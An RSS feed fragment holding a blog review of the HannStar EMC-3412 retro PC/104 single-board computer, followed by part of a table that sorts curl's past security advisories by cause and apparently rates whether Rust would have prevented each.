<div><figure><img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201%201'%3E%3C/svg%3E" data-src="https://www.researchgate.net/profile/Kay_Roemer/publication/215619137/figure/fig2/AS:667826658480133@1536233691415/The-RoBM-2-board-replaces-the-Connector-Board-2-in-the-PC104-stack.ppm" alt="The RoBM 2 board replaces the Connector Board [2] in the PC104 stack." data-old-src="https://www.researchgate.net/profile/Kay_Roemer/publication/215619137/figure/fig2/AS:667826658480133@1536233691415/The-RoBM-2-board-replaces-the-Connector-Board-2-in-the-PC104-stack.ppm" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Stacked PC/104 cards (Image from  https://www.researchgate.net/)</figcaption></figure></div>



<p> The PC/104 standard includes 3 form factors:</p>



<ul><li>104<ul><li>3.550‚Ä≥ x 3.775‚Ä≥</li></ul></li><li>EBX<ul><li>5.75‚Ä≥ x 8‚Ä≥</li></ul></li><li>EPIC<ul><li>6.5‚Ä≥ x 4.5‚Ä≥</li></ul></li></ul>



<div><p>All of the above standards are electrically and physically compatible with one another, the only difference is the physical board size although the mounting holes and ports align. </p><p>More history on the PC/104 can be found on <a href="https://en.wikipedia.org/wiki/PC/104#History_and_standardization">Wikipedia here.</a> Lets have a look at a PC/104 compatible board. </p></div>



<h2><span id="The_HannStar_EMC3412"></span>The HannStar EMC-3412<span></span></h2>



<figure><img data-attachment-id="3450" data-permalink="https://blog.jmdawson.co.uk/img_1354/" data-orig-file="https://i1.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1354.jpg?fit=1217%2C930&amp;ssl=1" data-orig-size="1217,930" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_1354" data-image-description="" data-medium-file="https://i1.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1354.jpg?fit=300%2C229&amp;ssl=1" data-large-file="https://i1.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1354.jpg?fit=750%2C573&amp;ssl=1" loading="lazy" width="750" height="573" src="https://i1.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1354.jpg?resize=750%2C573&amp;is-pending-load=1#038;ssl=1" data-src="https://i1.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1354.jpg?resize=750%2C573&amp;ssl=1" alt="" data-srcset="https://i1.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1354.jpg?resize=1024%2C783&amp;ssl=1 1024w, https://i1.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1354.jpg?resize=300%2C229&amp;ssl=1 300w, https://i1.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1354.jpg?resize=768%2C587&amp;ssl=1 768w, https://i1.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1354.jpg?w=1217&amp;ssl=1 1217w" data-sizes="(max-width: 750px) 100vw, 750px" data-recalc-dims="1" data-old-src="https://i1.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1354.jpg?resize=750%2C573&amp;ssl=1" data-lazy-srcset="https://i1.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1354.jpg?resize=1024%2C783&amp;ssl=1 1024w, https://i1.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1354.jpg?resize=300%2C229&amp;ssl=1 300w, https://i1.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1354.jpg?resize=768%2C587&amp;ssl=1 768w, https://i1.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1354.jpg?w=1217&amp;ssl=1 1217w" data-lazy-src="https://i1.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1354.jpg?resize=750%2C573&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>The photo from the ebay listing that I purchased the device from</figcaption></figure>



<figure><img data-attachment-id="3451" data-permalink="https://blog.jmdawson.co.uk/img_1355/" data-orig-file="https://i0.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1355.jpg?fit=1242%2C910&amp;ssl=1" data-orig-size="1242,910" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_1355" data-image-description="" data-medium-file="https://i0.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1355.jpg?fit=300%2C220&amp;ssl=1" data-large-file="https://i0.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1355.jpg?fit=750%2C549&amp;ssl=1" loading="lazy" width="750" height="549" src="https://i0.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1355.jpg?resize=750%2C549&amp;is-pending-load=1#038;ssl=1" data-src="https://i0.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1355.jpg?resize=750%2C549&amp;ssl=1" alt="" data-srcset="https://i0.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1355.jpg?resize=1024%2C750&amp;ssl=1 1024w, https://i0.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1355.jpg?resize=300%2C220&amp;ssl=1 300w, https://i0.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1355.jpg?resize=768%2C563&amp;ssl=1 768w, https://i0.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1355.jpg?w=1242&amp;ssl=1 1242w" data-sizes="(max-width: 750px) 100vw, 750px" data-recalc-dims="1" data-old-src="https://i0.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1355.jpg?resize=750%2C549&amp;ssl=1" data-lazy-srcset="https://i0.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1355.jpg?resize=1024%2C750&amp;ssl=1 1024w, https://i0.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1355.jpg?resize=300%2C220&amp;ssl=1 300w, https://i0.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1355.jpg?resize=768%2C563&amp;ssl=1 768w, https://i0.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1355.jpg?w=1242&amp;ssl=1 1242w" data-lazy-src="https://i0.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1355.jpg?resize=750%2C549&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>The photo from the ebay listing that I purchased the device from</figcaption></figure>



<div><p>The HannStar EMC-3412 is a PC104 compatible SBC produced sometime between 2001 and 2005, the board features a PC133 SODIMM slot, a USB header, PS/2 connector, RS232 Male and RS232 Female, VGA Video, CF and IDE. A NSC Geode GX1S@300Mhz and a single Realtek 100Mb NIC. </p><p>Whilst I purchase this board brand new with 128MB of RAM I‚Äôve struggled to find much information on the device. I decided to review it as if it was any other SBC. </p><p>I installed Debian 8 onto a 4GB Microdrive using Virtualbox with my <a href="https://amzn.to/2MR7SGi" target="_blank" rel="noreferrer noopener sponsored nofollow">BENFEI 4in1 USB USB-C to SD Micro SD MS CF Card Reader </a>as the board does not boot from USB and I did not have a IDE optical drive to hand. Debian 8 is the final release of Debian to support i586 processors. The install ran smoothly and the board booted without issue from the MicroDrive fitted in its CF card slot.</p><p>The board is powered using a standard Molex 4 pin connector although it appears that it only uses the 5v pins. I created a makeshift adaptor to run this device off USB. </p></div>







<h3><span id="CPU_Information"></span>CPU Information<span></span></h3>



<figure><img data-attachment-id="3442" data-permalink="https://blog.jmdawson.co.uk/screen-shot-2021-01-10-at-20-16-36/" data-orig-file="https://i1.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/Screen-Shot-2021-01-10-at-20.16.36.png?fit=492%2C318&amp;ssl=1" data-orig-size="492,318" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Screen Shot 2021-01-10 at 20.16.36" data-image-description="" data-medium-file="https://i1.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/Screen-Shot-2021-01-10-at-20.16.36.png?fit=300%2C194&amp;ssl=1" data-large-file="https://i1.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/Screen-Shot-2021-01-10-at-20.16.36.png?fit=492%2C318&amp;ssl=1" loading="lazy" width="492" height="318" src="https://i1.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/Screen-Shot-2021-01-10-at-20.16.36.png?resize=492%2C318&amp;is-pending-load=1#038;ssl=1" data-src="https://i1.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/Screen-Shot-2021-01-10-at-20.16.36.png?resize=492%2C318&amp;ssl=1" alt="" data-srcset="https://i1.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/Screen-Shot-2021-01-10-at-20.16.36.png?w=492&amp;ssl=1 492w, https://i1.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/Screen-Shot-2021-01-10-at-20.16.36.png?resize=300%2C194&amp;ssl=1 300w" data-sizes="(max-width: 492px) 100vw, 492px" data-recalc-dims="1" data-old-src="https://i1.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/Screen-Shot-2021-01-10-at-20.16.36.png?resize=492%2C318&amp;ssl=1" data-lazy-srcset="https://i1.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/Screen-Shot-2021-01-10-at-20.16.36.png?w=492&amp;ssl=1 492w, https://i1.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/Screen-Shot-2021-01-10-at-20.16.36.png?resize=300%2C194&amp;ssl=1 300w" data-lazy-src="https://i1.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/Screen-Shot-2021-01-10-at-20.16.36.png?resize=492%2C318&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>



<p>The CPU runs at 300MHz and has very few features, it is a x86 compatible i586 processor.</p>



<h3><span id="Power_Consumption"></span>Power Consumption<span></span></h3>



<figure><img data-attachment-id="3448" data-permalink="https://blog.jmdawson.co.uk/img_1351/" data-orig-file="https://i2.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1351-scaled.jpg?fit=1920%2C2560&amp;ssl=1" data-orig-size="1920,2560" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone 8 Plus&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1610313108&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;3.99&quot;,&quot;iso&quot;:&quot;100&quot;,&quot;shutter_speed&quot;:&quot;0.2&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_1351" data-image-description="" data-medium-file="https://i2.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1351-scaled.jpg?fit=225%2C300&amp;ssl=1" data-large-file="https://i2.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1351-scaled.jpg?fit=750%2C1000&amp;ssl=1" loading="lazy" width="750" height="1000" src="https://i0.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1351.jpg?resize=750%2C1000&amp;is-pending-load=1#038;ssl=1" data-src="https://i0.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1351.jpg?resize=750%2C1000&amp;ssl=1" alt="" data-srcset="https://i2.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1351-scaled.jpg?resize=768%2C1024&amp;ssl=1 768w, https://i2.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1351-scaled.jpg?resize=225%2C300&amp;ssl=1 225w, https://i2.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1351-scaled.jpg?resize=1152%2C1536&amp;ssl=1 1152w, https://i2.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1351-scaled.jpg?w=1920&amp;ssl=1 1920w, https://i2.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1351-scaled.jpg?w=1500&amp;ssl=1 1500w" data-sizes="(max-width: 750px) 100vw, 750px" data-recalc-dims="1" data-old-src="https://i0.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1351.jpg?resize=750%2C1000&amp;ssl=1" data-lazy-srcset="https://i2.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1351-scaled.jpg?resize=768%2C1024&amp;ssl=1 768w, https://i2.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1351-scaled.jpg?resize=225%2C300&amp;ssl=1 225w, https://i2.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1351-scaled.jpg?resize=1152%2C1536&amp;ssl=1 1152w, https://i2.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1351-scaled.jpg?w=1920&amp;ssl=1 1920w, https://i2.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1351-scaled.jpg?w=1500&amp;ssl=1 1500w" data-lazy-src="https://i0.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1351.jpg?resize=750%2C1000&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>



<div><p>Power consumption isn‚Äôt as bad as I expected pulling only 1w at idle and 6w at full load.I measured the power consumption with my <a href="https://amzn.to/394jTja" target="_blank" rel="noreferrer noopener">Keweisi USB Power meter</a> and a custom cable. </p></div>



<h3><span id="Benchmarks"></span>Benchmarks<span></span></h3>



<p>I ran UnixBench to compare this to my other SBC‚Äôs and it Scored a total of 16! That‚Äôs 4x slower than even a Raspberry Pi Zero. </p>



<figure><img data-attachment-id="3452" data-permalink="https://blog.jmdawson.co.uk/hannstar-emc-3412-a-retro-x86-sbc/image-8/" data-orig-file="https://i2.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/image-8.png?fit=1574%2C955&amp;ssl=1" data-orig-size="1574,955" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image-8" data-image-description="" data-medium-file="https://i2.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/image-8.png?fit=300%2C182&amp;ssl=1" data-large-file="https://i2.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/image-8.png?fit=750%2C455&amp;ssl=1" loading="lazy" width="750" height="455" src="https://i2.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/image-8.png?resize=750%2C455&amp;is-pending-load=1#038;ssl=1" data-src="https://i2.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/image-8.png?resize=750%2C455&amp;ssl=1" alt="" data-srcset="https://i2.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/image-8.png?resize=1024%2C621&amp;ssl=1 1024w, https://i2.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/image-8.png?resize=300%2C182&amp;ssl=1 300w, https://i2.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/image-8.png?resize=768%2C466&amp;ssl=1 768w, https://i2.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/image-8.png?resize=1536%2C932&amp;ssl=1 1536w, https://i2.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/image-8.png?resize=1568%2C951&amp;ssl=1 1568w, https://i2.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/image-8.png?w=1574&amp;ssl=1 1574w" data-sizes="(max-width: 750px) 100vw, 750px" data-recalc-dims="1" data-old-src="https://i2.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/image-8.png?resize=750%2C455&amp;ssl=1" data-lazy-srcset="https://i2.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/image-8.png?resize=1024%2C621&amp;ssl=1 1024w, https://i2.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/image-8.png?resize=300%2C182&amp;ssl=1 300w, https://i2.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/image-8.png?resize=768%2C466&amp;ssl=1 768w, https://i2.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/image-8.png?resize=1536%2C932&amp;ssl=1 1536w, https://i2.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/image-8.png?resize=1568%2C951&amp;ssl=1 1568w, https://i2.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/image-8.png?w=1574&amp;ssl=1 1574w" data-lazy-src="https://i2.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/image-8.png?resize=750%2C455&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>



<h2><span id="Conclusion"></span>Conclusion <span></span></h2>



<p>The Hannstar EMC-3412 was fun to play with and would likely make a great Retro Gaming machine although I can‚Äôt think of any real useful use cases for the board in 2021. I purchased this new on ebay and the seller still has a fair few for sale priced at ¬£30 with make offer, I made a very low offer and it was accepted. If you‚Äôd like to try one out for yourself you can buy one <a href="https://www.ebay.com/itm/NEW-SINGLE-BOARD-COMPUTER-ECM-3412-P-N-1907341200/164283322681?ssPageName=STRK%3AMEBIDX%3AIT&amp;_trksid=p2057872.m2749.l2649">here</a>. </p>



<div><p>The PC/104 standard is still widely used in embedded computing with lots of manufacturers producing new boards with modern CPU‚Äôs however they are very expensive and designed for very specific applications. </p><p>If you would like to see more covered on retro SBC‚Äôs leave a comment below.  </p></div>

	</div><!-- .entry-content -->

	<!-- .entry-footer -->

				
</article></div>]]>
            </description>
            <link>https://blog.jmdawson.co.uk/hannstar-emc-3412-a-retro-x86-sbc/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25805877</guid>
            <pubDate>Sat, 16 Jan 2021 21:56:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Would Rust Secure Curl?]]>
            </title>
            <description>
<![CDATA[
Score 124 | Comments 110 (<a href="https://news.ycombinator.com/item?id=25805576">thread link</a>) | @todsacerdoti
<br/>
January 16, 2021 | https://timmmm.github.io/curl-vulnerabilities-rust/ | <a href="https://web.archive.org/web/*/https://timmmm.github.io/curl-vulnerabilities-rust/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <tr>
        <td>95</td>
        <td>wrong connect-only connection</td>
        <td>Logic, pointers</td>
        <td>2</td>
      </tr>
      <tr>
        <td>94</td>
        <td>curl overwrite local file with -J</td>
        <td>Logic</td>
        <td>1</td>
      </tr>
      <tr>
        <td>93</td>
        <td>Partial password leak over DNS on HTTP redirect</td>
        <td>Logic, quoting</td>
        <td>1</td>
      </tr>
      <tr>
        <td>92</td>
        <td>FTP-KRB double-free</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>91</td>
        <td>TFTP small blocksize heap buffer overflow</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>90</td>
        <td>Windows OpenSSL engine code injection</td>
        <td>Logic</td>
        <td>0</td>
      </tr>
      <tr>
        <td>89</td>
        <td>TFTP receive buffer overflow</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>88</td>
        <td>Integer overflows in curl_url_set</td>
        <td>Integer overflow leading to memory</td>
        <td>3</td>
      </tr>
      <tr>
        <td>87</td>
        <td>NTLM type-2 out-of-bounds buffer read</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>86</td>
        <td>NTLMv2 type-3 header stack buffer overflow</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>85</td>
        <td>SMTP end-of-response out-of-bounds read</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>84</td>
        <td>warning message out-of-buffer read</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>83</td>
        <td>use-after-free in handle close</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>82</td>
        <td>SASL password overflow via integer overflow</td>
        <td>Integer overflow leading to memory</td>
        <td>3</td>
      </tr>
      <tr>
        <td>81</td>
        <td>NTLM password overflow via integer overflow</td>
        <td>Integer overflow leading to memory</td>
        <td>3</td>
      </tr>
      <tr>
        <td>80</td>
        <td>SMTP send heap buffer overflow</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>79</td>
        <td>FTP shutdown response buffer overflow</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>78</td>
        <td>RTSP bad headers buffer over-read</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>77</td>
        <td>RTSP RTP buffer over-read</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>76</td>
        <td>LDAP NULL pointer dereference</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>75</td>
        <td>FTP path trickery leads to NIL byte out of bounds write</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>74</td>
        <td>HTTP authentication leak in redirects</td>
        <td>Logic</td>
        <td>0</td>
      </tr>
      <tr>
        <td>73</td>
        <td>HTTP/2 trailer out-of-bounds read</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>72</td>
        <td>SSL out of buffer access</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>71</td>
        <td>FTP wildcard out of bounds read</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>70</td>
        <td>NTLM buffer overflow via integer overflow</td>
        <td>Integer overflow leading to memory</td>
        <td>3</td>
      </tr>
      <tr>
        <td>69</td>
        <td>IMAP FETCH response out of bounds read</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>68</td>
        <td>FTP PWD response parser out of bounds read</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>67</td>
        <td>URL globbing out of bounds read</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>66</td>
        <td>TFTP sends more than buffer size</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>65</td>
        <td>FILE buffer read out of bounds</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>64</td>
        <td>URL file scheme drive letter buffer overflow</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>63</td>
        <td>TLS session resumption client cert bypass (again)</td>
        <td>Logic, reuse</td>
        <td>0</td>
      </tr>
      <tr>
        <td>62</td>
        <td>--write-out out of buffer read</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>61</td>
        <td>SSL_VERIFYSTATUS ignored</td>
        <td>Logic</td>
        <td>0</td>
      </tr>
      <tr>
        <td>60</td>
        <td>uninitialized random</td>
        <td>Type error</td>
        <td>4</td>
      </tr>
      <tr>
        <td>59</td>
        <td>printf floating point buffer overflow</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>58</td>
        <td>Win CE schannel cert wildcard matches too much</td>
        <td>Logic</td>
        <td>0</td>
      </tr>
      <tr>
        <td>57</td>
        <td>Win CE schannel cert name out of buffer read</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>56</td>
        <td>cookie injection for other servers</td>
        <td>Logic, difficult to use API</td>
        <td>3</td>
      </tr>
      <tr>
        <td>55</td>
        <td>case insensitive password comparison</td>
        <td>Logic, terrible function name</td>
        <td>0</td>
      </tr>
      <tr>
        <td>54</td>
        <td>OOB write via unchecked multiplication</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>53</td>
        <td>double-free in curl_maprintf</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>52</td>
        <td>double-free in krb5 code</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>51</td>
        <td>glob parser write/read out of bounds</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>50</td>
        <td>curl_getdate read out of bounds</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>49</td>
        <td>URL unescape heap overflow via integer truncation</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>48</td>
        <td>Use-after-free via shared cookies</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>47</td>
        <td>invalid URL parsing with '#'</td>
        <td>Logic, used regex, now 2 problems</td>
        <td>0</td>
      </tr>
      <tr>
        <td>46</td>
        <td>IDNA 2003 makes curl use wrong host</td>
        <td>Logic, unicode insanity</td>
        <td>1</td>
      </tr>
      <tr>
        <td>45</td>
        <td>curl escape and unescape integer overflows</td>
        <td>Integer overflow leading to memory</td>
        <td>3</td>
      </tr>
      <tr>
        <td>44</td>
        <td>Incorrect reuse of client certificates</td>
        <td>Logic, reuse</td>
        <td>0</td>
      </tr>
      <tr>
        <td>43</td>
        <td>TLS session resumption client cert bypass</td>
        <td>Logic, reuse</td>
        <td>0</td>
      </tr>
      <tr>
        <td>42</td>
        <td>Re-using connections with wrong client cert</td>
        <td>Logic, reuse</td>
        <td>0</td>
      </tr>
      <tr>
        <td>41</td>
        <td>use of connection struct after free</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>40</td>
        <td>Windows DLL hijacking</td>
        <td>Windows API nonsense</td>
        <td>0</td>
      </tr>
      <tr>
        <td>39</td>
        <td>TLS certificate check bypass with mbedTLS/PolarSSL</td>
        <td>Logic</td>
        <td>0</td>
      </tr>
      <tr>
        <td>38</td>
        <td>remote file name path traversal in curl tool for Windows</td>
        <td>Logic, quoting</td>
        <td>0</td>
      </tr>
      <tr>
        <td>37</td>
        <td>NTLM credentials not-checked for proxy connection re-use</td>
        <td>Logic, reuse</td>
        <td>0</td>
      </tr>
      <tr>
        <td>36</td>
        <td>SMB send off unrelated memory contents</td>
        <td>Memory, but I think this is still reading from valid allocated memory, heartbleed style</td>
        <td>0</td>
      </tr>
      <tr>
        <td>35</td>
        <td>lingering HTTP credentials in connection re-use</td>
        <td>Logic, reuse</td>
        <td>0</td>
      </tr>
      <tr>
        <td>34</td>
        <td>sensitive HTTP server headers also sent to proxies</td>
        <td>Logic</td>
        <td>0</td>
      </tr>
      <tr>
        <td>33</td>
        <td>host name out of boundary memory access</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>32</td>
        <td>cookie parser out of boundary memory access</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>31</td>
        <td>Negotiate not treated as connection-oriented</td>
        <td>Logic</td>
        <td>0</td>
      </tr>
      <tr>
        <td>30</td>
        <td>Re-using authenticated connection when unauthenticated</td>
        <td>Logic, reuse</td>
        <td>0</td>
      </tr>
      <tr>
        <td>29</td>
        <td>darwinssl certificate check bypass</td>
        <td>Logic, reuse</td>
        <td>0</td>
      </tr>
      <tr>
        <td>28</td>
        <td>URL request injection</td>
        <td>Logic</td>
        <td>0</td>
      </tr>
      <tr>
        <td>27</td>
        <td>duphandle read out of bounds</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>26</td>
        <td>cookie leak for TLDs</td>
        <td>Logic, parsing</td>
        <td>0</td>
      </tr>
      <tr>
        <td>25</td>
        <td>cookie leak with IP address as domain</td>
        <td>Logic</td>
        <td>0</td>
      </tr>
      <tr>
